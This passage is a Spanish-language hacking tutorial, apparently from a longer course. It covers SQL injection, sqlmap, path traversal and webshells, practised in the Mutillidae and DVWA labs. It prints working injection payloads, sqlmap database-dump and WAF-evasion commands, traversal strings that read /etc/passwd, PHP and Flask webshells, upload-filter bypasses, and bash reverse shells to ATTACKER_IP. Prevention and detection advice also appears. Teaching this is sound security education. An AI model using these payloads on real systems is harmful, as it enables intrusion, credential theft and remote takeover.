SELECT * FROM usuarios WHERE nombre = '' OR '1'='1';
```

➡️ ¡Esto siempre es verdadero! Devuelve **todos los usuarios**.

---

### 🌟 2️⃣ ¿Por qué sucede?

✅ Porque la aplicación **arma las consultas SQL con texto plano** usando los datos del usuario:

```php
$query = "SELECT * FROM usuarios WHERE nombre = '$input_usuario'";
```

✅ No usa **parámetros preparados** ni filtrado.

---

### 🌟 3️⃣ Ejemplo de código vulnerable (muy fácil)

**Código PHP vulnerable:**

```php
<?php
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

✅ Un atacante podría poner en el URL:

```
http://victima.com/login.php?user=admin' --
```

✅ Y el SQL se vuelve:

```sql
SELECT * FROM users WHERE username = 'admin' -- ';
```

➡️ El `--` es comentario en SQL: ignora el resto.

✅ Resultado: ¡Acceso como admin!

---

### 🌟 4️⃣ Tipos comunes de SQL Injection

✅ **Classic / In-band:**

- El atacante ve el resultado directamente.
- Ejemplo: `' OR '1'='1`

✅ **Blind:**

- No hay error ni resultado claro, pero puedes deducirlo por cambios en la app.
- Ejemplo: `' AND 1=1 -- ` vs `' AND 1=2 -- `

✅ **Error-based:**

- Usas errores de SQL para obtener info.
- Ejemplo: `' UNION SELECT NULL, version() -- `

✅ **Union-based:**

- Combinas resultados de varias tablas.
- Ejemplo: `' UNION SELECT user, password FROM users -- `

✅ **Time-based (Blind):**

- Usas retardos para inferir datos.
- Ejemplo en MySQL:

  ```
  ' OR IF(1=1, SLEEP(5), 0) --
  ```

---

### 🌟 5️⃣ Payloads de ejemplo (fáciles)

✅ Bypass login:

```
' OR '1'='1
```

✅ Forzar error:

```
' ORDER BY 100 --
```

✅ Union simple:

```
' UNION SELECT null, null --
```

✅ Obtener versión de la base:

```
' UNION SELECT 1, version() --
```

✅ Blind boolean:

```
' AND 1=1 --
' AND 1=2 --
```

✅ Time-based (MySQL):

```
' OR IF(1=1, SLEEP(5), 0) --
```

---

### 🌟 6️⃣ Instalación de entorno para practicar

⚠️ **Importante:** Solo debes practicar en entornos controlados y legales.

---

#### ✅ Opción A: Mutillidae II

Mutillidae es una app web deliberadamente vulnerable.

✅ Paso 1: Instala XAMPP (Windows)

- Descarga de:
  👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)
- Instala y abre XAMPP Control Panel.
- Activa **Apache** y **MySQL**.

✅ Paso 2: Descarga Mutillidae

- [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)
- Descarga ZIP y descomprime.

✅ Paso 3: Copia la carpeta

- Copia `mutillidae` en:

  ```
  C:\xampp\htdocs\
  ```

✅ Paso 4: Configura la base

- Abre:

  ```
  http://localhost/phpmyadmin
  ```

- Crea base de datos `mutillidae`.

✅ Paso 5: Accede

- Navegador:

  ```
  http://localhost/mutillidae
  ```

- Haz clic en **Reset DB**.

✅ ¡Listo para practicar!

---

#### ✅ Opción B: DVWA (Damn Vulnerable Web App)

✅ Similar proceso:

- Descarga de [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA).
- Copia a `htdocs`.
- Configura `config.inc.php`.
- Abre en navegador:

  ```
  http://localhost/dvwa
  ```

- Haz **Setup Database**.

✅ ¡Incluye lecciones de SQLi!

---

### 🌟 7️⃣ Ejemplo real en Mutillidae

✅ Abre Mutillidae:

```
http://localhost/mutillidae
```

✅ Ve a:

```
OWASP Top 10 → A1 Injection → User Info (SQL)
```

✅ Verás un campo para ID de usuario.

✅ Inyecta:

```
1' OR '1'='1
```

✅ Pulsa **Submit**.

✅ Resultado:

✔️ En lugar de un usuario → ¡te da todos!

---

### 🌟 8️⃣ Usar Burp Suite para SQLi

✅ Instala Burp Suite (gratis Community):

👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

✅ Configura tu navegador para usar proxy:

- HTTP Proxy: `127.0.0.1`
- Puerto: `8080`

✅ Abre Mutillidae → navega → captura la solicitud en Burp → **Send to Repeater**.

✅ Modifica el parámetro:

```
user_id=1' OR '1'='1
```

✅ Pulsa **Send**.

✅ Ve la respuesta → ¡verás la inyección funcionando!

---

### 🌟 9️⃣ Prevención de SQL Injection

✅ Usar **parámetros preparados** (Prepared Statements).

**Ejemplo en PHP (MySQLi):**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

✅ Nunca concatenar directamente entradas del usuario.

✅ Filtrado y validación.

✅ Mínimos privilegios a la base de datos.

---

### 🌟 10 Resumen

✅ SQL Injection = inyectar código SQL malicioso en consultas.

✅ Explota la falta de validación.

✅ Muy peligroso: robo, modificación o borrado de datos.

✅ Practícalo **solo en entornos legales** como Mutillidae o DVWA.

✅ Aprende a interceptar y modificar solicitudes con Burp Suite.

---

### ✅ 🎯 Recursos para seguir aprendiendo

✅ OWASP Mutillidae II:

👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ DVWA:

👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

✅ OWASP SQL Injection Cheat Sheet:

👉 [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

[🔼](#índice)

---

## **61. SQLmap: Blind SQL Injection**

### 🌟 1️⃣ ¿Qué es Blind SQL Injection?

**Blind SQL Injection** (SQLi ciega) es un tipo de inyección SQL donde **la aplicación no muestra errores ni resultados directamente**.

✅ La inyección sigue siendo posible.

✅ Pero no devuelve datos obvios en la respuesta.

✅ El atacante debe **inferir** la información indirectamente.

---

#### ✅ Concepto fácil

✅ En SQLi **clásica**:

- Tú inyectas:

  ```
  ' OR '1'='1
  ```

- Resultado: te muestra **todos los datos**.

✅ En **Blind SQLi**:

- Tú inyectas:

  ```
  ' AND 1=1 --
  ```

- Respuesta: página normal.

- Tú inyectas:

  ```
  ' AND 1=2 --
  ```

- Respuesta: página de error o diferente.

➡️ ¡No ves los datos, pero puedes deducir verdades/falsedades!

---

✅ Técnicas típicas de Blind SQLi:

🔎 **Boolean-based (Content-based):**

- Cambias la condición para ver si la respuesta varía.

🔎 **Time-based:**

- Usas funciones de retraso como `SLEEP()` para forzar pausas.

✅ Ejemplo en MySQL:

```
' OR IF(1=1, SLEEP(5), 0) --
```

➡️ Si tarda 5 segundos, sabes que la condición es verdadera.

---

### 🌟 2️⃣ ¿Qué es sqlmap?

✅ **sqlmap** es **una herramienta automática** de código abierto para encontrar y explotar inyecciones SQL.

✔️ Es muy popular entre pentesters y estudiantes.

✔️ Puede detectar y explotar **Blind SQLi** (y muchas más variantes).

✔️ Facilita lo que sería un ataque manual MUY laborioso.

---

✅ sqlmap puede:

🔎 Detectar SQLi (incluyendo Blind)

📜 Enumerar bases de datos, tablas y columnas

🗝️ Volcar datos

🧩 Usar técnicas boolean-based, error-based, time-based

🔐 Usar credenciales personalizadas

---

### 🌟 3️⃣ Instalación de sqlmap

✅ sqlmap es **gratuito** y multiplataforma.

---

#### ✅ A. En Linux (Ubuntu/Kali)

Muy fácil:

```bash
sudo apt update
sudo apt install sqlmap
```

Para verificar:

```bash
sqlmap --help
```

---

✅ Otra forma:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --help
```

---

#### ✅ B. En Windows

✅ Opción sencilla:

- Descarga el zip oficial:

  👉 [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

- Descomprime.
- Abre CMD o PowerShell.
- Navega a la carpeta:

  ```
  cd ruta\sqlmap
  ```

- Ejecuta:

  ```
  python sqlmap.py --help
  ```

⚠️ Necesitas tener **Python** instalado.

---

### 🌟 4️⃣ Preparar un entorno vulnerable (¡legal y seguro!)

✅ NUNCA ataques sitios reales sin permiso.

✅ Usa aplicaciones de entrenamiento:

✔️ **Mutillidae II**

✔️ **DVWA**

✔️ **Juice Shop**

✅ Ejemplo recomendado: Mutillidae en XAMPP

✔️ URL típica local:

```
http://localhost/mutillidae
```

✔️ Escenario de práctica:

```
OWASP Top 10 → A1 Injection → User Info
```

✅ Allí tendrás un **GET** con parámetro vulnerable, como:

```
http://localhost/mutillidae/index.php?page=user-info.php&user_id=1
```

---

### 🌟 5️⃣ Concepto de uso de sqlmap

✅ sqlmap se alimenta de **la URL con parámetro**.

✅ Tú le dices dónde sospechas la inyección.

✅ sqlmap prueba técnicas:

- Error-based
- Union-based
- Boolean-based
- Time-based

✅ En Blind SQLi:

- sqlmap usa respuestas **diferentes** o **retardos** para extraer datos.

---

### 🌟 6️⃣ Ejemplo MUY FÁCIL

✅ Imagina que tienes esta URL en Mutillidae:

```
http://localhost/mutillidae/index.php?page=user-info.php&user_id=1
```

✅ Sospechas SQLi en **user_id**.

---

#### 📌 Paso a paso con sqlmap

---

##### ✅ Paso 1: Detectar SQLi (incluyendo Blind)

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1"
```

✔️ sqlmap probará técnicas.

✔️ Si encuentra inyección, lo dirá:

```
Parameter 'user_id' is vulnerable.
```

---

##### ✅ Paso 2: Forzar solo técnicas Blind

Si quieres _solo_ Blind (boolean-based, time-based):

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" --technique=B,T
```

✔️ `B` = Boolean-based

✔️ `T` = Time-based

---

##### ✅ Paso 3: Obtener bases de datos

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" --dbs
```

➡️ sqlmap extraerá los nombres de las bases.

⚠️ En Blind SQLi, esto puede ser lento, porque se hace **caracter por caracter**.

---

##### ✅ Paso 4: Elegir una base y extraer tablas

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae --tables
```

---

##### ✅ Paso 5: Obtener columnas

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae -T accounts --columns
```

---

##### ✅ Paso 6: Volcar datos

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae -T accounts -C username,password --dump
```

✔️ Resultado:

```
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin123 |
| user     | pass456  |
+----------+----------+
```

---

### 🌟 7️⃣ Ejemplo de Blind Time-Based SQLi

✅ sqlmap detectará esto automáticamente.

Pero si quieres forzarlo:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" --technique=T
```

➡️ sqlmap enviará payloads como:

```
1 AND IF(SUBSTRING((SELECT database()),1,1)='m', SLEEP(5), 0) --
```

✔️ Si el servidor tarda 5 segundos → la letra es correcta.

✔️ Así deduce **caracter por caracter**.

---

### 🌟 8️⃣ Consejos para usar sqlmap en Blind SQLi

✅ Usa **--risk** y **--level** para más payloads:

```bash
--risk=3 --level=5
```

✅ Usa **--delay** si el servidor limita peticiones:

```bash
--delay=2
```

✅ Guarda resultados:

```bash
--output-dir=./resultados
```

✅ Interactivo:

```bash
--batch
```

Para contestar automáticamente con "sí" a prompts.

---

### 🌟 9️⃣ Ejemplo COMPLETO para Mutillidae

✅ Comando:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" --technique=B,T --dbs --batch
```

✅ Resultado típico:

```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] parameter 'user_id' is vulnerable
[INFO] available databases:
[*] information_schema
[*] mutillidae
```

---

✅ Después:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae --tables --batch
```

✅ Resultado:

```
[*] accounts
[*] blogs
[*] credit_cards
```

---

✅ Luego:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae -T accounts --columns --batch
```

✅ Resultado:

```
[*] id
[*] username
[*] password
```

---

✅ Finalmente:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1" -D mutillidae -T accounts -C username,password --dump --batch
```

✅ Resultado:

```
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin123 |
```

---

### 🌟 10 Buenas prácticas

✅ **Siempre pide permiso.**

✅ Usa **entornos vulnerables para práctica**.

✅ Aprende a reconocer **Blind SQLi** manualmente.

✅ Usa **Burp Suite** para interceptar solicitudes y preparar payloads.

✅ Usa sqlmap para automatizar y ahorrar tiempo.

---

### ✅ RESUMEN

✅ **Blind SQLi** = inyección sin mensajes de error ni resultados directos.

✅ Se basa en **comportamiento** (respuestas distintas) o **retardos (Time-based)**.

✅ **sqlmap** automatiza la detección y explotación.

✅ Prueba en **Mutillidae**, **DVWA** o **Juice Shop** para aprender de forma segura.

---

### ✅ Recursos

🔗 sqlmap oficial:

👉 [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

🔗 OWASP Mutillidae II:

👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

🔗 DVWA:

👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

---

[🔼](#índice)

---

## **62. SQLmap: Funcionalidad**

### ✅ SQLmap: Funcionalidad, instalación, ejemplos y cómo usarlo

#### 🎯 ¿Qué es sqlmap?

**sqlmap** es una poderosa **herramienta automática de inyección SQL** escrita en Python. Su objetivo es detectar y explotar vulnerabilidades SQL en aplicaciones web de forma automática y sencilla.

---

#### 🧠 ¿Qué hace exactamente sqlmap?

✅ Detecta si un parámetro web es vulnerable a SQL Injection.

✅ Exfiltra datos de bases de datos automáticamente.

✅ Soporta distintos tipos de SQL Injection (hasta Blind SQLi).

✅ Automatiza tareas que manualmente serían muy lentas.

✅ Permite ejecutar comandos en el sistema operativo si el servidor lo permite.

✅ Soporta múltiples bases de datos: **MySQL, PostgreSQL, Oracle, MSSQL, SQLite**, etc.

---

#### 🧰 Funcionalidades principales de sqlmap

| Función                          | Qué hace                                                                                      |
| -------------------------------- | --------------------------------------------------------------------------------------------- |
| **Detección automática de SQLi** | Identifica tipos de inyección SQL (Error-based, Boolean-based, Union-based, Time-based, etc). |
| **Extracción de datos**          | Extrae información de bases de datos: nombres de DB, tablas, columnas y datos.                |
| **Bypass de WAFs**               | Tiene opciones para evadir firewalls o filtros de seguridad.                                  |
| **Autenticación**                | Soporta cookies, HTTP Auth, headers personalizados.                                           |
| **Carga de archivos**            | Si la DB lo permite, puede leer/escribir archivos.                                            |
| **Ejecución de comandos**        | Ejecuta comandos del sistema si hay vulnerabilidad.                                           |

---

#### 🛠️ Instalación de sqlmap

##### ✅ En Linux (Kali, Ubuntu, Parrot, etc.)

**Opción 1: desde repositorios**

```bash
sudo apt update
sudo apt install sqlmap
```

**Opción 2: desde GitHub (última versión)**

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --help
```

---

##### ✅ En Windows

1. Instala Python 3: [https://www.python.org/downloads/](https://www.python.org/downloads/)
2. Descarga sqlmap desde GitHub: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
3. Extrae el archivo ZIP.
4. Abre PowerShell o CMD, navega a la carpeta extraída:

```bash
cd ruta\sqlmap
python sqlmap.py --help
```

---

#### 🧪 Ejemplo fácil de uso

Imagina esta URL vulnerable:

```
http://localhost/mutillidae/index.php?page=user-info.php&user_id=1
```

El parámetro `user_id` está en la mira.

---

##### ✅ Comando básico para detectar inyección:

```bash
sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&user_id=1"
```

Resultado:

```
[INFO] parameter 'user_id' is vulnerable
```

---

#### 🔍 Funcionalidades con ejemplos

---

##### 1️⃣ Detectar y explotar SQLi

```bash
sqlmap -u "http://localhost/app.php?id=1"
```

- sqlmap detectará si el parámetro `id` es vulnerable.

---

##### 2️⃣ Ver bases de datos del servidor

```bash
sqlmap -u "http://localhost/app.php?id=1" --dbs
```

- Extrae todos los nombres de bases de datos.

---

##### 3️⃣ Ver tablas de una base de datos

```bash
sqlmap -u "http://localhost/app.php?id=1" -D nombre_db --tables
```

---

##### 4️⃣ Ver columnas de una tabla

```bash
sqlmap -u "http://localhost/app.php?id=1" -D nombre_db -T nombre_tabla --columns
```

---

##### 5️⃣ Extraer datos de columnas

```bash
sqlmap -u "http://localhost/app.php?id=1" -D nombre_db -T nombre_tabla -C usuario,password --dump
```

- Extrae datos de las columnas `usuario` y `password`.

---

##### 6️⃣ Ataque automático completo (modo agresivo)

```bash
sqlmap -u "http://localhost/app.php?id=1" --dump-all
```

- Extrae **todo lo que pueda**.

---

##### 7️⃣ SQLi con cookie (autenticación por sesión)

```bash
sqlmap -u "http://localhost/app.php?id=1" --cookie="PHPSESSID=abc123"
```

---

##### 8️⃣ SQLi en POST

```bash
sqlmap -u "http://localhost/login.php" --data="usuario=admin&clave=123"
```

---

##### 9️⃣ Forzar uso de técnica específica (por ejemplo, Time-based)

```bash
sqlmap -u "http://localhost/app.php?id=1" --technique=T
```

- `T`: Time-based
- `B`: Boolean-based
- `E`: Error-based
- `U`: Union-based
- `S`: Stacked queries

---

##### 🔐 10 Autenticación básica (HTTP Auth)

```bash
sqlmap -u "http://localhost/privado.php?id=1" --auth-type=basic --auth-cred=usuario:clave
```

---

##### 🛡️ 11 Bypass WAF

```bash
sqlmap -u "http://victima.com/index.php?id=1" --tamper=space2comment
```

- Tamper scripts ayudan a evadir filtros de seguridad como ModSecurity.

---

### 🧪 Ejemplo completo paso a paso

#### Paso 1: Detectar vulnerabilidad

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc123; security=low"
```

#### Paso 2: Ver bases de datos

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --dbs
```

#### Paso 3: Tablas de `dvwa`

```bash
sqlmap -u "http://localhost/dvwa/..." --cookie="..." -D dvwa --tables
```

#### Paso 4: Columnas de `users`

```bash
sqlmap -u "http://localhost/dvwa/..." --cookie="..." -D dvwa -T users --columns
```

#### Paso 5: Volcar usuarios y contraseñas

```bash
sqlmap -u "http://localhost/dvwa/..." --cookie="..." -D dvwa -T users -C user,password --dump
```

---

### 📦 Extras útiles

| Opción               | Descripción                                     |
| -------------------- | ----------------------------------------------- |
| `--batch`            | Responde automáticamente a todas las preguntas. |
| `--risk=3 --level=5` | Aumenta la agresividad del análisis.            |
| `--random-agent`     | Usa user-agents aleatorios.                     |
| `--threads=5`        | Usa múltiples hilos (más rápido).               |

---

### ⚠️ Advertencia ética

✅ sqlmap es para fines educativos y auditorías con permiso.

❌ Nunca lo uses en sitios reales sin autorización.

⚠️ Su uso indebido puede tener consecuencias legales.

---

### 📚 Recursos oficiales

- sqlmap: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
- Cheat Sheet: [https://github.com/sqlmapproject/sqlmap/wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- OWASP Mutillidae: [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)
- DVWA: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

---

### ✅ Resumen final

| Acción             | Comando                                     |
| ------------------ | ------------------------------------------- |
| Detectar SQLi      | `sqlmap -u "URL"`                           |
| Ver bases de datos | `--dbs`                                     |
| Ver tablas         | `-D nombre_db --tables`                     |
| Ver columnas       | `-D nombre_db -T tabla --columns`           |
| Extraer datos      | `-D nombre_db -T tabla -C col1,col2 --dump` |
| Modo agresivo      | `--dump-all`                                |

---

[🔼](#índice)

---

## **63. Path Traversal**

### ✅ 1️⃣ ¿Qué es Path Traversal?

**Path Traversal** (o Directory Traversal) es una vulnerabilidad que permite a un atacante **acceder a archivos en el servidor** fuera del directorio previsto por la aplicación.

✅ En otras palabras: te metes en **carpetas donde no deberías entrar**.

---

#### 📌 Idea sencilla

Imagina que tienes una web donde puedes ver documentos:

```
https://example.com/view?file=manual.pdf
```

El servidor toma **manual.pdf** y abre:

```
/var/www/html/files/manual.pdf
```

---

✅ Pero si no valida el nombre del archivo, puedes hacer:

```
https://example.com/view?file=../../../../etc/passwd
```

El servidor abre:

```
/etc/passwd
```

⚠️ Resultado: lees archivos confidenciales.

---

### ✅ 2️⃣ Ejemplo muy fácil

✅ **Código vulnerable en PHP:**

```php
<?php
$file = $_GET['file'];
include("files/" . $file);
?>
```

✅ Normal:

```
view.php?file=manual.pdf
```

➡️ Abre:

```
files/manual.pdf
```

---

✅ Inyección maliciosa:

```
view.php?file=../../../../etc/passwd
```

➡️ Abre:

```
/etc/passwd
```

⚠️ ¡Acceso a un archivo del sistema!

---

✅ Otro ejemplo en Windows:

```
view.php?file=..\\..\\..\\..\\Windows\\win.ini
```

---

### ✅ 3️⃣ ¿Cómo funciona técnicamente?

Se basa en las **secuencias especiales**:

- `../` en Linux/Unix
- `..\` en Windows

✅ `../` significa “sube un nivel”.

---

✅ Ejemplo de ruta:

```
/var/www/html/files/manual.pdf
```

Si usas:

```
../../../etc/passwd
```

✔️ El servidor resuelve la ruta:

```
/var/www/html/files/../../../etc/passwd
➡️ /etc/passwd
```

---

✅ Resultado: lees **cualquier archivo** que el servidor tenga permiso para abrir.

---

### ✅ 4️⃣ Instalación de entorno vulnerable

Para practicar **legalmente y seguro**, vamos a usar aplicaciones vulnerables:

✅ OWASP **Mutillidae II**

✅ **DVWA** (Damn Vulnerable Web App)

---

#### 🟣 A. Instalar Mutillidae II

✅ 1️⃣ Instalar XAMPP (Windows)

- Descarga desde:
  👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)
- Instala y abre XAMPP Control Panel.
- Inicia **Apache** y **MySQL**.

✅ 2️⃣ Descargar Mutillidae II

- Link:
  👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)
- Descarga ZIP y descomprime.

✅ 3️⃣ Copiar a htdocs

- Copia la carpeta `mutillidae` en:

  ```
  C:\xampp\htdocs\
  ```

✅ 4️⃣ Acceder en navegador

```
http://localhost/mutillidae
```

✅ 5️⃣ Configurar

- Haz clic en "Setup/Reset DB".

¡Listo!

---

#### 🟣 B. Instalar DVWA

✅ Muy similar:

- Descarga desde:
  👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
- Copia a `htdocs`.
- Configura `config.inc.php`.
- Visita:

  ```
  http://localhost/dvwa
  ```

- Haz clic en **Setup Database**.

---

✅ Estas apps tienen ejercicios de **Path Traversal** listos para practicar.

---

### ✅ 5️⃣ Cómo usarlo paso a paso (en Mutillidae)

✅ Abre Mutillidae:

```
http://localhost/mutillidae
```

✅ Ve a:

```
OWASP Top 10 → A4 Insecure Direct Object References → File Inclusion
```

---

✅ Verás algo como:

```
page=about.php
```

✅ Prueba con:

```
page=../../../../etc/passwd
```

✔️ Resultado: contenido del archivo `/etc/passwd`.

---

✅ En Windows:

```
page=..\\..\\..\\..\\Windows\\win.ini
```

---

✅ En algunos labs:

```
page=../../../var/log/apache2/access.log
```

---

✅ Esto te enseña:

✔️ Cómo navegar directorios.

✔️ Cómo probar diferentes rutas.

✔️ Cómo leer archivos sensibles.

---

### ✅ 6️⃣ Ejemplos fáciles de payloads

✅ Linux:

```
../../../../etc/passwd
../../../../etc/hosts
../../../../var/log/apache2/error.log
```

✅ Windows:

```
..\\..\\..\\..\\Windows\\win.ini
..\\..\\..\\..\\boot.ini
```

✅ Variantes para evadir filtros:

```
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
```

✅ Con null byte (algunos lenguajes antiguos):

```
../../../../etc/passwd%00
```

---

### ✅ 7️⃣ Práctica con Burp Suite

✅ Abre Burp Suite.

✅ Configura navegador para proxy en 127.0.0.1:8080.

✅ Intercepta la petición vulnerable.

✅ Modifica el parámetro `page` con tu payload:

```
../../../../etc/passwd
```

✅ Envía y analiza la respuesta.

---

✅ Puedes automatizar con Intruder:

- Define el parámetro vulnerable.
- Usa payload list:

  ```
  ../../../../etc/passwd
  ../../../../etc/hosts
  ../../../../var/log/apache2/error.log
  ```

- Ejecuta ataque.

---

### ✅ 8️⃣ Cómo prevenir Path Traversal

✅ Validar input:

✔️ Permitir solo nombres válidos:

```
if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $file)) {
    die("Invalid filename");
}
```

✅ Usar rutas fijas:

✔️ Sin concatenar input del usuario directamente.

✅ Usar funciones de **basename()**:

✔️ Remueve los `../`:

```php
$file = basename($_GET['file']);
```

✅ Configurar permisos del servidor:

✔️ El usuario del servidor no debe tener acceso a archivos sensibles.

---

### ✅ 9️⃣ Resumen fácil

✅ **Path Traversal** = Escapar del directorio previsto usando `../`.

✅ Permite leer archivos del sistema.

✅ Ejemplo simple:

```
../../../../etc/passwd
```

✅ Entornos para practicar:

- Mutillidae II
- DVWA

✅ Prevención:

- Validar input
- Evitar concatenación de rutas
- Usar funciones seguras

---

### ✅ 10 Recursos útiles

🔗 Mutillidae:
👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

🔗 DVWA:
👉 [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

🔗 OWASP Path Traversal Cheat Sheet:
👉 [https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html)

---

[🔼](#índice)

---

## **64. WebShells**

### 🔍 1. ¿Qué es una WebShell?

Una **WebShell** es un script malicioso (PHP, ASP, JSP, etc.) que un atacante sube a un servidor vulnerable para obtener **una consola remota tipo terminal** a través del navegador web.

✅ Una WebShell da acceso total o parcial al **sistema de archivos**, comandos del sistema, y en algunos casos, a bases de datos.

---

#### 📌 Imagina:

Subes este archivo a un servidor vulnerable:

```php
<?php system($_GET['cmd']); ?>
```

Luego accedes con el navegador:

```
http://victima.com/shell.php?cmd=whoami
```

✅ Resultado: ejecuta el comando `whoami` en el servidor y te devuelve el resultado.

---

### 🛠️ 2. ¿Para qué sirve una WebShell?

- 🧠 **Ejecutar comandos del sistema** (como si tuvieras consola)
- 📂 **Ver archivos del servidor**
- ✏️ **Modificar código o subir malware**
- 💉 **Pivotar para escalar privilegios**
- 🗑️ **Borrar logs o rastros**
- 📡 **Mantener acceso persistente**

---

### 📂 3. Ejemplos simples de WebShells

#### ✅ A. WebShell básica en PHP

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

📌 Uso:

```
http://localhost/shell.php?cmd=ls
```

✔️ Te devuelve el listado de archivos.

---

#### ✅ B. WebShell en Python con Flask (educativo)

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()

app.run(host='0.0.0.0', port=8080)
```

📌 Guardas como `shell.py`, ejecutas y pruebas:

```
http://localhost:8080/?cmd=whoami
```

---

#### ✅ C. WebShell más compleja: **PentestMonkey PHP Reverse Shell**

Este es un script que **conecta al atacante en reversa**:

1. Atacante escucha con netcat:

```bash
nc -lvnp 4444
```

2. Víctima ejecuta shell que hace:

```php
$ip = "10.0.0.1"; // IP del atacante
$port = 4444;
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
```

✅ El atacante ahora tiene **una shell en su máquina** desde el servidor.

---

### 🔧 4. Cómo instalar y usar una WebShell (práctica segura)

#### ⚠️ **Solo debes practicar en entornos propios o de laboratorio.** Nunca en sistemas reales o sin permiso.

---

#### ✅ Paso 1: Instalar entorno vulnerable

Puedes usar:

- 🟣 **Mutillidae II**
- 🟡 **DVWA (Damn Vulnerable Web App)**
- ⚫️ O usar una **máquina virtual de Kali Linux + XAMPP** para montar tu propia web

---

#### ✅ Paso 2: Subir WebShell a servidor

##### Con DVWA:

1. Cambia nivel de seguridad a **Low**
2. Ve a la sección:

   ```
   File Upload
   ```

3. Intenta subir un archivo `.php` como:

```php
<?php system($_GET['cmd']); ?>
```

4. En algunos casos debes **modificar extensiones** con doble extensión:

```
shell.php.jpg
```

O modificar el código para que parezca imagen:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

#### ✅ Paso 3: Usar la WebShell

Si logras subirlo, accede así:

```
http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
```

Puedes usar:

- `ls`, `pwd`, `cat index.php`, `whoami`, `id`, `uname -a`

---

#### ✅ Paso 4: Acceso reverso con nc

Atacante escucha:

```bash
nc -lvnp 4444
```

Luego haces que la WebShell contenga:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

### 🔐 5. ¿Cómo protegerte contra WebShells?

✅ **1. Validar extensiones y tipo de archivo en uploads**

✅ **2. Guardar archivos fuera del directorio web (`/uploads` ≠ `/public_html`)**

✅ **3. Deshabilitar ejecución de código en carpetas de subida** (`.htaccess`)

✅ **4. Escanear con antivirus / herramientas EDR**

✅ **5. Monitorear cambios en archivos del servidor**

✅ **6. Deshabilitar funciones peligrosas en PHP**:

```ini
disable_functions = exec,passthru,shell_exec,system
```

✅ **7. Usar WAF (Firewall de Aplicación Web)** para detectar WebShells

---

### 🛡️ 6. Detección de WebShells

- 🚨 Cambios sospechosos en `/var/www/html/`
- 🚨 Archivos `.php`, `.jsp`, `.aspx` inesperados
- 🚨 Tráfico saliente anormal (indicador de reverse shell)
- 🚨 Comandos ejecutados por el usuario web (`www-data`, `apache`, etc.)
- 🚨 Presencia de palabras como `cmd`, `eval`, `exec`, `base64_decode`, `system`, etc.

---

### 📚 7. Recursos útiles

- [https://github.com/tennc/webshell](https://github.com/tennc/webshell) (repositorio de cientos de WebShells)
